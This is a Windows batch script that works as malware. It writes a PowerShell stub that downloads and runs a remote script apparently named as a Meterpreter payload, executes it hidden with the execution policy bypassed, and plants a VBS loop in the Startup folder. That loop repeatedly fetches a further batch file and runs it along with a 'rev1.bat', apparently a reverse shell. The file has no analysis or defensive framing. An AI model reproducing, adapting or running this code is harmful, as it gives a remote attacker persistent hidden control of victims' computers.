@echo off
:loop
    if not exist "%temp%\sh1.ps1" (
        echo IEX ^(New-Object System.Net.WebClient^).DownloadString^('https://raw.githubusercontent.com/0x2034/meterpreter1/main/meter1.ps1'^) >> "%temp%\sh1.ps1"
    )
    powershell -ep bypass -WindowStyle Hidden -File "%temp%\sh1.ps1"
    :check_start_vbs
    if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.vbs" (
         echo Do > "%temp%\start.vbs"
         echo    Set objShell = CreateObject^("WScript.Shell"^) >> "%temp%\start.vbs"
         echo    objShell.Run "cmd /c curl https://raw.githubusercontent.com/0x2034/meterpreter1/main/nihbtdtdow1.bat -o %temp%\nihbtdtdow1.bat", 0, True >> "%temp%\start.vbs"
         echo    objShell.Run "powershell -WindowStyle Hidden -Command Start-Process -FilePath '%temp%\nihbtdtdow1.bat' -WindowStyle Hidden", 0, True >> "%temp%\start.vbs"
         echo    objShell.Run "powershell -c Start-Process -FilePath '%temp%\rev1.bat' -WindowStyle Hidden", 0, True >> "%temp%\start.vbs"
         echo    WScript.Sleep 900000 >> "%temp%\start.vbs"
         echo Loop >> "%temp%\start.vbs"
         move "%temp%\start.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" 
    ) 
    timeout /t 15 /nobreak >nul
    goto check_start_vbs
timeout /t 300 /nobreak >nul
goto loop
